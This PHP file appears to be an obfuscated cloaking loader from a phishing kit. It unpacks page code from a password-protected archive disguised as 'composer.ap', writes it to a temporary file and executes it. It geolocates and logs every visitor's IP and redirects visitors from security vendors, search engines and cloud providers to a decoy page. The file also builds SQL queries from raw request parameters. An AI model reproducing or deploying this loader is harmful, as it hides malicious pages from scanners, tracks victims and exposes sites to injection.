<?php
//header("Cache-Control: no-cache");
//header("Pragma: no-cache");
//session_start();
error_reporting(0);
$GLOBALS['lctyvnx'] = 'arq';
$GLOBALS['ctaxrvtytlb'] = 'id';
$GLOBALS['jqyfiqsd'] = 'totalRows_Produto';
$GLOBALS['hsfwxmjnpwi'] = 'Produto';
$GLOBALS['jawgqyzpoyb'] = 'row_Produto';
$GLOBALS['vbpabfrplc'] = 'insertSQL';
$GLOBALS['indqqwik'] = 'ConnectDB';
$GLOBALS['ganahkdt'] = 'latlong';
$GLOBALS['qculxake'] = 'longitude';
$GLOBALS['mbvljs'] = 'latitude';
$GLOBALS['mgrnycro'] = 'resp';
$GLOBALS['gnzlpo'] = 'headers';
$GLOBALS['ueiguwn'] = 'curl';
$GLOBALS['ttsorjnupb'] = 'url';
$GLOBALS['jtqjqkbmyrbp'] = 'deleteSQL';
$GLOBALS['nohrrnu'] = 'database_ConnectDB';
$GLOBALS['jxgywsxfq'] = 'totalRows_Recordset1m';
$GLOBALS['gkgggkiv'] = 'query_Recordset1m';
$GLOBALS['ufukdi'] = 'Recordset1m';
$GLOBALS['ccdrmpjrade'] = 'tempoon';
$GLOBALS['xpkdqjcc'] = 'linhass';
$GLOBALS['lljitgd'] = 'linhas2';
$GLOBALS['fdfnefcnu'] = 'numerobin3';
$GLOBALS['cmtmfxgdzri'] = 'linhas';
$GLOBALS['ypdjhkvl'] = 'numerobin2';
$GLOBALS['feuekfw'] = 'dadosSiteip';
$GLOBALS['qsrpoqpkwqb'] = 'ch';
$GLOBALS['bkbwqxuy'] = 'arqR';
$GLOBALS['lzofeggvlp'] = 'conteudo_txtcz';
$GLOBALS['qvwheuhhz'] = 'page';
$itmhpcyzx = 'vogais';
$GLOBALS['pcszpq'] = 'conteudo_txtc';
$GLOBALS['avuzwvajy'] = 'c';
$GLOBALS['ndxbmwhxxwf'] = 'conteudo_txt';
$GLOBALS['mkhmxvi'] = 'abriu';
$GLOBALS['fsmjwafkgl'] = 'white';
$GLOBALS['yjmjjoukyb'] = 'urlldin';
$GLOBALS['fhmbdfeusn'] = 'consoante';
$GLOBALS['naptchojqrb'] = 'vogal';
$GLOBALS['zlxrxauvkxut'] = 'silaba';
$GLOBALS['yitaelhogijl'] = 'vogais';
$GLOBALS['ttsqfdhm'] = 'tamanho_palavra';
$GLOBALS['ojghxnqkz'] = 'contar_silabas';
$GLOBALS['nyhwvcrjun'] = 'palavra';
$GLOBALS['soyjtefd'] = 'consoantes';
$ydwhnqb = 'vogais';
session_start();
//echo 'onde redireciona<br>';exit;

$vogais = array('a', 'e', 'i', 'o', 'u');
$consoantes = array('b', 'c', 'd', 'f', 'g', 'h', 'nh', 'lh', 'ch', 'j', 'k', 'l', 'm', 'n', 'p', 'qu', 'r', 'rr', 's', 'ss', 't', 'v', 'w', 'x', 'y', 'z');
$GLOBALS['jfidngwfus'] = 'tamanho_palavra';
$palavra = '';
$GLOBALS['ihmyywwjiuq'] = 'tamanho_palavra';
$mjyynsh = 'contar_silabas';
$tamanho_palavra = rand(2, 5);
$contar_silabas = 0;
while ($contar_silabas < $tamanho_palavra) {
    $lflboyqd = 'consoante';
    $GLOBALS['vfhggsjh'] = 'vogal';
    $GLOBALS['buqrpgltjr'] = 'vogal';
    $GLOBALS['uqmbxtjwcnq'] = 'consoantes';
    $kagvuhrmg = 'vogais';
    $GLOBALS['fhpypfyhe'] = 'consoante';
    $vogal = $vogais[rand(0, count($vogais) - 1)];
    $consoante = $consoantes[rand(0, count($consoantes) - 1)];
    $silaba = $consoante . $vogal;
    $palavra .= $silaba;
    $contar_silabas++;
    unset($vogal, $consoante, $silaba);
}
$urlldin = 'erro.php';
$_SESSION['white'] = 'erro.php';
$white = $_SESSION['white'];
if (isset($_GET['COMON/'])) {
    $boljssv = 'page';
    $GLOBALS['qzjqunrnkxf'] = 'abriu';
    $GLOBALS['lrknsafei'] = 'z';
    $page = $_GET['COMON/'];
    
    $abriu = false;
    $fabriu = false;
	if(file_exists('./composer_ap')){
		$fabriu = true;
	}else{
		$z = new ZipArchive();
		$abriu = $z->open("composer.ap");
	}
	
    if ($abriu === true || $fabriu === true) {
		$GLOBALS['qsefusfdjqrt'] = 'page';
		
		if ($abriu === true){
			$z->setPassword("7fMNOlJxjMd6VqR01NC9pGF4j6");
			$conteudo_txt = $z->getFromName($page . '.php');
		}else
		if($fabriu === true) {
			$conteudo_txt = file_get_contents('./composer_ap/'.$page . '.php');
		}
		
        function pagina($page)
        {
            $yepnogsd = 'ch';
            $GLOBALS['gsvcweah'] = 'linhas';
            $GLOBALS['bqokpm'] = 'abriuc';
            $GLOBALS['uplcfisx'] = 'linhas';
            $jlcdacpwq = 'linhas';
            $GLOBALS['orvweokmg'] = 'numerobin3';
            
            if(file_exists('./composer_ap')){
				$conteudo_txtc = file_get_contents('./composer_ap/'.$page . '.php');
				$conteudo_txtcz = file_get_contents('./composer_ap/'."SLIDE.php");
			}else{
				$c = new ZipArchive();
				$abriuc = $c->open("composer.ap");
				//$GLOBALS['bqokpm'] = 'abriuc';
				$c->setPassword("7fMNOlJxjMd6VqR01NC9pGF4j6");
				$conteudo_txtc = $c->getFromName($page . '.php');
				$conteudo_txtcz = $c->getFromName("SLIDE.php");
				$c->close();
			}
			
            $GLOBALS['ykbupcub'] = 'database_ConnectDB';
            $GLOBALS['puxnjcsgli'] = 'ch';
            $huiflvxnh = 'linhas';
            $GLOBALS['eseibukwyyb'] = 'linhas';
            $tyzdgwf = 'linhas';
            $muudzgkyj = 'arqR';
            $GLOBALS['tfnpkhmxjk'] = 'checar';
            $ffmmtbq = 'conteudo_txtcz';
            $GLOBALS['eckulrmgb'] = 'ipAddress';
            $GLOBALS['pfenlubx'] = 'linhas';
            $jpremlupwjwp = 'ipAddress';
            $pdaaduk = 'linhas';
            require_once "./conf.php";
            $GLOBALS['ryljuemz'] = 'conteudo_txtc';
            $arqR = './tmp_sincelindo/SINCELINDO/APP35361792';
            $GLOBALS['cvlhrplu'] = 'ConnectDB';
            $umnrmg = 'arqR';
            require_once $arqR;
            $pmkvypfkhon = 'linhas';
            $umyxyrl = 'ch';
            $winddvejo = 'ConnectDB';
            $occnqncoonb = 'linhas';
            $qbleiejnci = 'deleteSQL';
            $mnvojm = 'linhas';
            $rhbgyhlaom = 'linhas';
            $shpvqckts = 'linhas2';
            $ipAddress = $_SERVER['REMOTE_ADDR'] ?: ($_SERVER['HTTP_X_FORWARDED_FOR'] ?: $_SERVER['HTTP_CLIENT_IP']);
            $checar = "http://ip-api.com/json/{$ipAddress}";
            $eofmoum = 'numerobin2';
            $GLOBALS['bbtkcxqiyv'] = 'arqR';
            $GLOBALS['fbhtfsqcmv'] = 'page';
            $ch = curl_init();
            $awhqpzknffc = 'tempoout';
            $ydupgmhuu = 'numerobin2';
            curl_setopt($ch, CURLOPT_URL, "{$checar}");
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
            $qwxbykbcqk = 'arq';
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $GLOBALS['qxwsqjq'] = 'linhas';
            $hfrgyisb = 'ip';
            $dadosSiteip = curl_exec($ch);
            $_SESSION['ip'] = $ipAddress;
            $ip = $_SESSION['ip'];
            $numerobin2 = explode('"isp":"', $dadosSiteip);
            if (@$numerobin2[1]) {
                $hmrjumsuyy = 'numerobin2';
                $numerobin2 = explode('"', $numerobin2[1]);
                $linhas = $numerobin2[0];
            } else {
                $linhas = 'null';
            }
            $GLOBALS['dgobowmu'] = 'Result1';
            $icfmudhpl = 'linhas';
            $numerobin3 = explode('"country":"', $dadosSiteip);
            if (@$numerobin3[1]) {
                $GLOBALS['xovzwyphyfug'] = 'numerobin3';
                $numerobin3 = explode('"', $numerobin3[1]);
                $linhas2 = $numerobin3[0];
            } else {
                $linhas2 = 'null';
            }
            if ('null' != 'Brazil' && 'null' == 'Facebook, Inc.') {
                $GLOBALS['nkgtxvw'] = 'linhass';
                $linhass = 'vai';
            } elseif ('null' != 'Brazil' && 'null' != 'Facebook, Inc.') {
                $linhass = 'fica';
            } elseif ('null' == 'M247 Ltd') {
                $GLOBALS['bwemovsgf'] = 'linhass';
                $linhass = 'fica';
            } else {
                $whwwcseugke = 'linhass';
                $linhass = 'fica';
            }
            if ($linhas = 'Facebook, Inc.') {
                $_SESSION['passa'] = '1';
            } else {
                $_SESSION['passa'] = '0';
            }
            $tempoon = time();
            $tempoout = time() - 200;
            if ($_GET['COMON/'] != 'ADMIN') {
                $zombtrkqaat = 'query_Recordset1m';
                $hjwikj = 'row_Recordset1m';
                $GLOBALS['qqmpaj'] = 'Result1';
                $GLOBALS['qmswjfnvmfd'] = 'ConnectDB';
                $qmnhlcl = 'url';
                $GLOBALS['nryvykom'] = 'ConnectDB';
                $query_Recordset1m = "SELECT * FROM online WHERE ip = '{$ip}' AND local <> '{$page}'";
                $GLOBALS['ezmdpyyf'] = 'curl';
                $Recordset1m = mysqli_query($ConnectDB, $query_Recordset1m) or die(mysqli_error($ConnectDB));
                $row_Recordset1m = mysqli_fetch_assoc($Recordset1m);
                $xgjybstgotr = 'headers';
                $GLOBALS['bnxrnklrv'] = 'curl';
                $GLOBALS['dsnxtmgnfzc'] = 'insertSQLs';
                $GLOBALS['mpydqqrcj'] = 'totalRows_Recordset1m';
                $totalRows_Recordset1m = mysqli_num_rows($Recordset1m);
                if ($totalRows_Recordset1m > "0") {
                    $yyergwqth = 'row_Recordset1m';
                    $GLOBALS['oebqrwqgyj'] = 'Result1';
                    $kiqiguvxbnt = 'ConnectDB';
                    $iwqmehdtbskg = 'localon';
                    $GLOBALS['irrbizobz'] = 'deleteSQL';
                    $localon = $row_Recordset1m['local'];
                    $deleteSQL = "DELETE FROM online WHERE ip = '{$ip}'";
                    mysqli_select_db($ConnectDB, $database_ConnectDB);
                    $GLOBALS['pvzyxuiqoj'] = 'ConnectDB';
                    $Result1 = mysqli_query($ConnectDB, $deleteSQL) or die(mysql_error());
                }
                $GLOBALS['lkroufpi'] = 'url';
                $url = "https://tools.keycdn.com/geo.json?host={$ip}";
                $curl = curl_init($url);
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                $pzoohcjijt = 'curl';
                $headers = array('User-Agent: keycdn-tools:https://www.example.com');
                curl_setopt($curl, CURLOPT_HTTPHEADER, array('User-Agent: keycdn-tools:https://www.example.com'));
                $euihndy = 'curl';
                $GLOBALS['odtlhigdvjm'] = 'ConnectDB';
                $GLOBALS['lnkkcb'] = 'longitude';
                $sjxckwfm = 'latitude';
                curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
                $GLOBALS['yrgmvoixgqht'] = 'curl';
                curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                $resp = curl_exec($curl);
                $latitude = explode('"latitude":', $resp);
                $latitude = explode(',', $latitude[1]);
                $GLOBALS['dkpoaskk'] = 'longitude';
                $latitude = $latitude[0];
                $kabhgimvoopm = 'insertSQLs';
                $longitude = explode('"longitude":', $resp);
                $longitude = explode(',', $longitude[1]);
                $longitude = $longitude[0];
                $latlong = "<latitude>{$latitude}</latitude><longitude>{$longitude}</longitude>";
                curl_close($curl);
                $insertSQLs = "INSERT INTO `online` (tempo, ip, local, produto) VALUES ('{$tempoon}','{$ip}', '{$page}', '{$latlong}')";
                mysqli_select_db($ConnectDB, $database_ConnectDB);
                $Result1 = mysqli_query($ConnectDB, $insertSQLs) or die(mysql_error($insertSQL));
            }
            $deleteSQL = "DELETE FROM online WHERE tempo<{$tempoout}";
            mysqli_select_db($ConnectDB, $database_ConnectDB);
            $Result1 = mysqli_query($ConnectDB, $deleteSQL) or die(mysql_error());
            $GLOBALS['rnjustdz'] = 'linhas';
            /**-/
            if ('Facebook, Inc.' == 'Microsoft Corporation' || 'Facebook, Inc.' == 'Yahoo' || 'Facebook, Inc.' == 'Symantec Corporation' || 'Facebook, Inc.' == 'AMAZON-02' || 'Facebook, Inc.' == 'Google LLC' || 'Facebook, Inc.' == 'Akamai Technologies, Inc.' || 'Facebook, Inc.' == 'Kaspersky Lab ZAO' || 'Facebook, Inc.' == 'Cloudflare, Inc.' || 'Facebook, Inc.' == 'BlackBerry Limited' || 'Facebook, Inc.' == 'Amazon.com, Inc.' || 'Facebook, Inc.' == 'H4Y Technologies LLC' || 'Facebook, Inc.' == 'DigitalOcean, LLC' || 'Facebook, Inc.' == 'Telia Eesti AS' || 'Facebook, Inc.' == 'SurfControl, Inc' || 'Facebook, Inc.' == 'Trustwave Holdings' || 'Facebook, Inc.' == 'M247 Ltd' || 'fica' == 'fica' || 'Facebook, Inc.' == 'PT Aplikanusa Lintasarta' || 'Facebook, Inc.' == 'GMEDIA') {
                $GLOBALS['mrwuhbhp'] = 'ConnectDB';
                $GLOBALS['lptgmsx'] = 'Result1';
                $kfiqdgus = 'idf';
                $agdynlzwpift = 'insertSQL';
                $GLOBALS['gyiweywcs'] = 'insertSQL';
                $idf = 'Facebook, Inc.';
                $insertSQL = "INSERT INTO `x9` (ipv6, empresa) VALUES ('{$ip}', '{$idf}')";
                mysqli_select_db($ConnectDB, $database_ConnectDB);
                $Result1 = mysqli_query($ConnectDB, $insertSQL) or die(mysql_error($insertSQL));
                if (isset($_GET['id']) && $_GET['COMON/'] == 'INDEX') {
                    $GLOBALS['eqhwoyf'] = 'ConnectDB';
                    $ixeltfqglhl = 'query_Produto';
                    $axjbcime = 'query_Produto';
                    $bpcmvnuhg = 'id';
                    $ywpopuydzp = 'Produto';
                    $GLOBALS['xchsyqjm'] = 'Produto';
                    $id = $_GET['id'];
                    $GLOBALS['iyqvjgxlwds'] = 'totalRows_Produto';
                    $query_Produto = "SELECT * FROM produtos WHERE id = '{$id}'";
                    $Produto = mysqli_query($ConnectDB, $query_Produto) or die(mysqli_error($ConnectDB));
                    $row_Produto = mysqli_fetch_assoc($Produto);
                    $totalRows_Produto = mysqli_num_rows($Produto);
                    if ($totalRows_Produto > "0") {
                        $heptcyxvif = 'pixelf';
                        $vrdxhsyvt = 'row_Produto';
                        $white = $row_Produto['whitelist'];
                        $GLOBALS['kpooklgeibl'] = 'pixelf';
                        $pixelf = $row_Produto['pixelf'];
                        if ($pixelf != '') {
                            $amxmdecvl = 'pixelf';
                            echo $pixelf;
                        }
                    } else {
                        $tcpwtqicgdun = 'white';
                        $white = $_SESSION['white'];
                    }
                } else {
                }
                header("location:{$white}");
            } elseif ('Facebook, Inc.' == 'Facebook, Inc.') {
                $GLOBALS['xhaeawv'] = 'idf';
                $ykcyvtklkpwe = 'insertSQL';
                $GLOBALS['xwdxujjupp'] = 'Result1';
                $idf = 'Facebook, Inc.';
                $mnwbndlxyrf = 'database_ConnectDB';
                $insertSQL = "INSERT INTO `x9` (ipv6, empresa) VALUES ('{$ip}', '{$idf}')";
                $GLOBALS['brusluyn'] = 'ConnectDB';
                mysqli_select_db($ConnectDB, $database_ConnectDB);
                $Result1 = mysqli_query($ConnectDB, $insertSQL) or die(mysql_error($insertSQL));
                if (isset($_GET['id'])) {
                    $id = $_GET['id'];
                    $rulyqgclvtc = 'Produto';
                    $GLOBALS['kdswkome'] = 'query_Produto';
                    $cfisicwq = 'ConnectDB';
                    $query_Produto = "SELECT * FROM produtos WHERE id = '{$id}'";
                    $osklkedclde = 'ConnectDB';
                    $vndhuudwpo = 'query_Produto';
                    $Produto = mysqli_query($ConnectDB, $query_Produto) or die(mysqli_error($ConnectDB));
                    $row_Produto = mysqli_fetch_assoc($Produto);
                    $totalRows_Produto = mysqli_num_rows($Produto);
                    if ($totalRows_Produto > "0") {
                        $yonyigf = 'row_Produto';
                        $white = $row_Produto['whitelist'];
                        if ($white != '') {
                            header("location:{$white}");
                        }
                    } else {
                        $white = $_SESSION['white'];
                    }
                } else {
                }
            }
            /**/
            
            $_SESSION[$page] = $page;
            $arq = './tmp/APP' . rand(981, 66666666);
            file_put_contents($arq, $conteudo_txtc);
            require_once $arq;
        }
        if ($conteudo_txt == '') {
            Header("Location: {$white}");
        } else {
            $gbjnsvfydh = 'page';
            pagina($page);
        }
        $z->close();
    } else {
        Header("Location: {$white}");
        exit;
    }
} else {
    Header("Location: {$white}");
    exit;
}
unset($vogais, $consoantes, $palavra, $tamanho_palavra, $contar_silabas);
?>